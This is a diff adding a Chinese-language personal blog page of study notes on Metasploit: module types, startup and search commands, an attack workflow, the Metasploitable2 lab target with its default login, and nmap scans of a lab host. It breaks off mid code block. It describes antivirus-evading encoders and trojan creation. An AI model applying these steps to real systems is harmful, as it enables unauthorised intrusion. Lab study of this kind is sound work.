@@ -1,0 +1,1657 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="MSF&amp;CS介绍与使用, wuk0Ng">
+    <meta name="description" content="wuk0Ng的个人博客">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>MSF&amp;CS介绍与使用 | wuk0Ng</title>
+    <link rel="icon" type="image/jpeg" href="/shaoqing.jpg">
+
+    <link rel="dns-prefetch" href="//hm.baidu.com">
+    <link rel="dns-prefetch" href="//zz.bdstatic.com">
+    <link rel="dns-prefetch" href="//busuanzi.ibruce.info">
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css?v=20260824-speed1">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css?v=20261026-compact3">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+   
+<style>
+    body{
+       background-image: url(/medias/my_background.webp);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/jiushen.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">wuk0Ng</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/jiushen.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">wuk0Ng</div>
+        <div class="logo-desc">
+            
+            wuk0Ng的个人博客
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/web-wuk0Ng" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/web-wuk0Ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.webp')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">MSF&amp;CS介绍与使用</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                                <span class="chip bg-color">红队</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%86%85%E7%BD%91/">
+                                <span class="chip bg-color">内网</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                记录
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2026-10-30
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>之前应该是打了好几个靶机了，大概流程也算清楚<br>但是还是要补基础，补八股</p>
+<h1 id="MSF-CS介绍与使用"><a href="#MSF-CS介绍与使用" class="headerlink" title="MSF&amp;CS介绍与使用"></a>MSF&amp;CS介绍与使用</h1><p><a target="_blank" rel="noopener" href="https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/msfcs%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8/#msfcs%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8">https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/msfcs%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8/#msfcs%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8</a><br>参考大佬博客<br>Metasploit Framework（MSF）<br>Metasploit是ruby语言开发的一个基于命令行操作的渗透测试框架，我们可以查找，利用和验证漏洞，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程</p>
+<h2 id="一、msf体系框架"><a href="#一、msf体系框架" class="headerlink" title="一、msf体系框架"></a>一、msf体系框架</h2><p>我们重点关注模块部分</p>
+<p>模块组织按照不同的用途分为7种类型的模块（Modules）：</p>
+<p>辅助模块（Aux)：负责信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能<br>渗透攻击模块（Exploits)：利用系统漏洞进行攻击，里面有每一个具体漏洞的攻击方法<br>后渗透攻击模块（Post)：在取得目标系统远程控制权限后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作<br>攻击载荷模块（payloads)：成功exploit之后，真正在目标系统执行的代码或指令<br>编码器模块（Encoders)：主要对payload进行加密，最终达到躲避AntiVirus检查的目的<br>空指令模块（Nops)：主要作用是提高payload稳定性及维持大小<br>免杀模块(Evasion)：可以用来创建木马文件</p>
+<h2 id="二、Metasploit基本使用"><a href="#二、Metasploit基本使用" class="headerlink" title="二、Metasploit基本使用"></a>二、Metasploit基本使用</h2><p>kali中自带了msf，可以直接使用</p>
+<h3 id="Metasploit启动"><a href="#Metasploit启动" class="headerlink" title="Metasploit启动"></a>Metasploit启动</h3><p>先启动Postgresql数据库，再启动Metasploit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>不启动数据库，直接启动Metasploit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>启动Postgresql的同时启动Metasploit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfdb run</span><br></pre></td></tr></table></figure>
+
+<p>也可以直接在kali左上角工具点击启动，实际上是自动执行了命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfdb init &amp;&amp; msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>由于Postgresql数据库的默认端口为5432，所以可以查看该端口来判断是否开启Postgresql数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -pantu | grep 5432</span><br></pre></td></tr></table></figure>
+
+<h3 id="Metasploit常用命令"><a href="#Metasploit常用命令" class="headerlink" title="Metasploit常用命令"></a>Metasploit常用命令</h3><p>在msfconsole中，输入help可以看见各种命令的介绍</p>
+<h4 id="show展示"><a href="#show展示" class="headerlink" title="show展示"></a>show展示</h4><p>用于展示可用模块，有效参数是：all，encoders，nops，exploits，payloads，auxiliary, post，plugins，info，options</p>
+<p>展示模块时，每个模块都会有一个名为Rank的字段，该列代表该模块的可靠性</p>
+<p>Rank 的值可以是下面的表格中的其中之一，按照可靠性降序排列</p>
+<table>
+<thead>
+<tr>
+<th>Ranking</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ExcellentRanking</td>
+<td>漏洞利用程序绝对不会使目标服务崩溃，就像 SQL 注入，命令执行，远程文件包含，本地文件包含等等。除非有特殊情况，典型的内存破坏利用程序不可以被评估为该级别。（WMF Escape()）</td>
+</tr>
+<tr>
+<td>GreatRanking</td>
+<td>该漏洞利用程序有一个默认的目标系统，并且可以自动检测适当的目标系统，或者在目标服务的版本检查之后可以返回到一个特定于应用的返回地址。（译者注：有些二进制的漏洞利用成功后，需要特别设置 Shell 退出后的返回地址，否则当 Shell 结束后，目标服务器会崩溃掉。）</td>
+</tr>
+<tr>
+<td>GoodRanking</td>
+<td>该漏洞利用程序有一个默认目标系统，并且是这种类型软件的“常见情况”（英文，桌面应用程序的 Windows 7，服务器的2012等常用）</td>
+</tr>
+<tr>
+<td>NormalRanking</td>
+<td>该漏洞利用程序是可靠的，但是依赖于特定的版本，并且不能或者不能可靠地自动检测。</td>
+</tr>
+<tr>
+<td>AverageRanking</td>
+<td>该漏洞利用程序不可靠或者难以利用。</td>
+</tr>
+<tr>
+<td>LowRanking</td>
+<td>对于通用的平台而言，该漏洞利用程序几乎不能利用（或者低于 50% 的利用成功率）</td>
+</tr>
+<tr>
+<td>ManualRanking</td>
+<td>该漏洞利用程序不稳定或者难以利用并且基于拒绝服务（DOS）。如果一个模块只有在用户特别配置该模块的时候才会被用到，否则该模块不会被使用到，那么也可以评为该等级。（例如：exploit&#x2F;unix&#x2F;webapp&#x2F;php_eval）</td>
+</tr>
+</tbody></table>
+<h4 id="search搜索"><a href="#search搜索" class="headerlink" title="search搜索"></a>search搜索</h4><p>已知一个漏洞，我想知道Metasploit里面是否有相关的模块，就可以用search进行搜索</p>
+<p>直接执行<code>search [要查找的内容]</code>（大小写不敏感），查得很广泛，可以根据名字、路径、平台、类型、联合查询，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#根据名字</span><br><span class="line">search name:mysql </span><br><span class="line"></span><br><span class="line">#根据路径</span><br><span class="line">search path:mysql</span><br><span class="line"></span><br><span class="line">#根据平台</span><br><span class="line">search platform:windows</span><br><span class="line"></span><br><span class="line">#根据类型</span><br><span class="line">search type:exploit</span><br><span class="line"></span><br><span class="line">#联合查询</span><br><span class="line">search name:mysql type:exploit rank:excellent</span><br></pre></td></tr></table></figure>
+
+<h4 id="use使用"><a href="#use使用" class="headerlink" title="use使用"></a>use使用</h4><p>通过search找到了目标模块后，用<code>use [序号]</code>或<code>use [全名]</code>使用具体模块</p>
+<p>在use了具体模块之后，有如下常用命令：</p>
+<ul>
+<li><strong>back：</strong>退出当前调用的模块</li>
+<li><strong>info：</strong>显示模块相关信息</li>
+<li><strong>show missing：</strong>展示必填的选项</li>
+<li><strong>show options：</strong>展示所有选项</li>
+<li><strong>show targets：</strong>展示可攻击目标</li>
+<li><strong>show payload：</strong>展示攻击载荷</li>
+<li><strong>set：</strong>用于设置选项中的参数</li>
+<li><strong>unset：</strong>取消设置参数</li>
+<li><strong>exploit&#x2F;run：</strong>配置好选项参数之后发起攻击（两者的参数规则略有区别）</li>
+</ul>
+<h2 id="三、Metasploit攻击流程"><a href="#三、Metasploit攻击流程" class="headerlink" title="三、Metasploit攻击流程"></a>三、Metasploit攻击流程</h2><ol>
+<li>已知漏洞（根据信息搜集到的端口开放，版本情况乱）</li>
+<li>查找模块</li>
+<li>配置程序</li>
+<li>执行</li>
+</ol>
+<h2 id="四、Metasploitable2-Linux靶机"><a href="#四、Metasploitable2-Linux靶机" class="headerlink" title="四、Metasploitable2-Linux靶机"></a>四、Metasploitable2-Linux靶机</h2><p>Metasploitable2虚拟系统是一个特别制作的ubuntu操作系统，本身设计目的是作为安全工具测试和演示常见漏洞攻击的环境。其中最重要的是可以用来作为MSF攻击用的靶机</p>
+<p>靶机开放了很多的高危端口如21、23、445等，而且具有很多未打补丁的高危漏洞， 如Samba MS-RPC Shell命令注入漏洞等，而且对外开放了很多服务，并且数据库允许外联等。系统中的用户口令均为弱口令。系统搭载了DVWA、Mutillidae等Web漏洞演练平台</p>
+<p>登录默认账号密码为<code>msfadmin:msfadmin</code></p>
+<h4 id="简单体验"><a href="#简单体验" class="headerlink" title="简单体验"></a>简单体验</h4><p>配置好靶机环境后，进行信息收集</p>
+<ul>
+<li>nmap进行端口扫描：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/桌面]</span><br><span class="line">└─# nmap -sT 192.168.111.136</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-23 06:46 EDT</span><br><span class="line">Nmap scan report for 192.168.111.136</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 977 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">23/tcp   open  telnet</span><br><span class="line">25/tcp   open  smtp</span><br><span class="line">53/tcp   open  domain</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">512/tcp  open  exec</span><br><span class="line">513/tcp  open  login</span><br><span class="line">514/tcp  open  shell</span><br><span class="line">1099/tcp open  rmiregistry</span><br><span class="line">1524/tcp open  ingreslock</span><br><span class="line">2049/tcp open  nfs</span><br><span class="line">2121/tcp open  ccproxy-ftp</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">5432/tcp open  postgresql</span><br><span class="line">5900/tcp open  vnc</span><br><span class="line">6000/tcp open  X11</span><br><span class="line">6667/tcp open  irc</span><br><span class="line">8009/tcp open  ajp13</span><br><span class="line">8180/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:3B:4C:26 (VMware)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>端口服务版本探测：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/桌面]</span><br><span class="line">└─# nmap -sV -p 1-65535 192.168.111.136</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-23 06:47 EDT</span><br><span class="line">Nmap scan report for 192.168.111.136</span><br><span class="line">Host is up (0.00066s latency).</span><br><span class="line">Not shown: 65505 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">21/tcp    open  ftp         vsftpd 2.3.4</span><br><span class="line">22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">23/tcp    open  telnet      Linux telnetd</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">53/tcp    open  domain      ISC BIND 9.4.2</span><br><span class="line">80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span><br><span class="line">111/tcp   open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">512/tcp   open  exec        netkit-rsh rexecd</span><br><span class="line">513/tcp   open  login?</span><br><span class="line">514/tcp   open  tcpwrapped</span><br><span class="line">1099/tcp  open  java-rmi    GNU Classpath grmiregistry</span><br><span class="line">1524/tcp  open  bindshell   Metasploitable root shell</span><br><span class="line">2049/tcp  open  nfs         2-4 (RPC #100003)</span><br><span class="line">2121/tcp  open  ftp         ProFTPD 1.3.1</span><br><span class="line">3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5</span><br><span class="line">3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))</span><br><span class="line">5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7</span><br><span class="line">5900/tcp  open  vnc         VNC (protocol 3.3)</span><br><span class="line">6000/tcp  open  X11         (access denied)</span><br><span class="line">6667/tcp  open  irc         UnrealIRCd</span><br><span class="line">6697/tcp  open  irc         UnrealIRCd</span><br><span class="line">8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)</span><br><span class="line">8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)</span><br><span class="line">38340/tcp open  mountd      1-3 (RPC #100005)</span><br><span class="line">43194/tcp open  nlockmgr    1-4 (RPC #100021)</span><br><span class="line">45036/tcp open  status      1 (RPC #100024)</span><br><span class="line">50911/tcp open  java-rmi    GNU Classpath grmiregistry</span><br><span class="line">MAC Address: 00:0C:29:3B:4C:26 (VMware)</span><br><span class="line">Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 139.73 seconds</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>接下来可以通过探测到的数据进行分析&#x2F;搜索，对可能存在漏洞的地方进行测试</li>
+<li>也可以直接使用nmap对主机或网段扫描是否存在常见的漏洞：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span 